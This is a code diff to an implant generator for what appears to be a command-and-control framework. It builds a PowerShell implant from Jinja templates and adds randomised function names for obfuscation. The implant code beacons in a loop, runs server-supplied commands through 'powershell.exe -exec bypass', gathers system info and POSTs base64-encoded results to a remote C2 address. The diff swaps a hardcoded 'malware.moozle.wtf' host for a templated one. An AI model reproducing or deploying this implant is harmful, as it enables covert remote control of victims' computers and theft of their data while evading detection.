@@ -9,12 +9,13 @@ class ImplantGenerator:
     #   which functionality should be embedded within the active implant.
 
     JinjaRandomisedArgs = {"rnd_function": "aaaaaa",
-                           "RemotePlayAudio": "RemotePlayAudio",
-                           "sleep": "sleep"
+                           "obf_remote_play_audio": "RemotePlayAudio",
+                           "obf_sleep": "sleep",
+                           "obf_collect_sysinfo":"collect_sysinfo"
                            }
 
     play_audio = '''
-function {{ ron.RemotePlayAudio }} {
+function {{ ron.obf_remote_play_audio }} {
     $args[0]
 }
             '''
@@ -31,7 +32,7 @@ function bbbbbb(){
     '''
 
     update_implant = '''
-function JfaSlt ($a) {
+function {{ ron.obf_collect_sysinfo }} ($a) {
     $b=($a -split "::")
     if ($b -Like " sys_info") {
         write-output "collecting sys_info"
@@ -83,10 +84,10 @@ function https-connection(){
 
     implant_main = '''
 start-sleep({{ initial_sleep }})
-${{ ron.sleep }}={{ beacon }}
+${{ ron.obf_sleep }}={{ beacon }}
 $sgep = "{{url}}"
 while($true){
-    start-sleep(${{ron.sleep}})
+    start-sleep(${{ ron.obf_sleep }})
     try {
         {{ proto_core }}
     }
@@ -97,7 +98,7 @@ while($true){
     if ( $headers -NotLike "=="){
         write-output "Non-sleep value"
         if ( $headers.Substring(0,2) -Like "::") {
-            JfaSlt($headers)
+            {{ ron.obf_collect_sysinfo }}($headers)
         } else {
             $tr = powershell.exe -exec bypass -C "$headers"
         }
@@ -108,7 +109,7 @@ while($true){
         $headers = @{}
         $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
         $headers.Add("X-Result",$b64tr)
-        $LoginResponse = Invoke-WebRequest 'http://malware.moozle.wtf:5000/help' -Headers $headers -Body $Body -Method 'POST'
+        $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ port }}/help' -Headers $headers -Body $Body -Method 'POST'
     }
 }
     '''
